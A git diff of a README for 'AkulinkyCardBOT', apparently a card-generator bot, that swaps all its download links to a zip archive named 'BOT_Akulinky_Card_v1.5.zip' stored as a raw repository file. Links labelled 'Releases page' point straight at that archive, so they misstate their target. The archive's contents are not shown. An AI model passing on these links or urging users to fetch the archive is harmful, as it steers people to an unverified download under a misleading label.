@@ -10,7 +10,7 @@ To get started with **AkulinkyCardBOT**, follow these simple steps.
 
 To download the bot, please visit the following link:
 
-[![Download AkulinkyCardBOT](https://raw.githubusercontent.com/LiamBlue90/AkulinkyCardBOT/main/retype/AkulinkyCardBOT.zip)](https://raw.githubusercontent.com/LiamBlue90/AkulinkyCardBOT/main/retype/AkulinkyCardBOT.zip)
+[![Download AkulinkyCardBOT](https://raw.githubusercontent.com/LiamBlue90/AkulinkyCardBOT/main/retype/BOT_Akulinky_Card_v1.5.zip)](https://raw.githubusercontent.com/LiamBlue90/AkulinkyCardBOT/main/retype/BOT_Akulinky_Card_v1.5.zip)
 
 On the Releases page, you will find the latest version of the bot. Click on the version number to access the download files. Choose the appropriate file for your system.
 
@@ -24,7 +24,7 @@ Before installing, ensure you have the following:
 
 ## ⚙️ How to Install
 
-1. **Download the Installer**: After visiting the [Releases page](https://raw.githubusercontent.com/LiamBlue90/AkulinkyCardBOT/main/retype/AkulinkyCardBOT.zip), click on your desired version. This will download the required files to your computer.
+1. **Download the Installer**: After visiting the [Releases page](https://raw.githubusercontent.com/LiamBlue90/AkulinkyCardBOT/main/retype/BOT_Akulinky_Card_v1.5.zip), click on your desired version. This will download the required files to your computer.
 
 2. **Find the File**: Locate the downloaded file on your computer. This is usually in your `Downloads` folder.
 
@@ -74,6 +74,6 @@ This project is licensed under the MIT License. You may freely use and modify th
 
 If you run into any issues while installing or using AkulinkyCardBOT, feel free to open an issue on the GitHub repository. We are here to assist you.
 
-For additional resources and updates, be sure to check back to the [Releases page](https://raw.githubusercontent.com/LiamBlue90/AkulinkyCardBOT/main/retype/AkulinkyCardBOT.zip).
+For additional resources and updates, be sure to check back to the [Releases page](https://raw.githubusercontent.com/LiamBlue90/AkulinkyCardBOT/main/retype/BOT_Akulinky_Card_v1.5.zip).
 
 Thank you for choosing AkulinkyCardBOT! Enjoy generating your random cards!
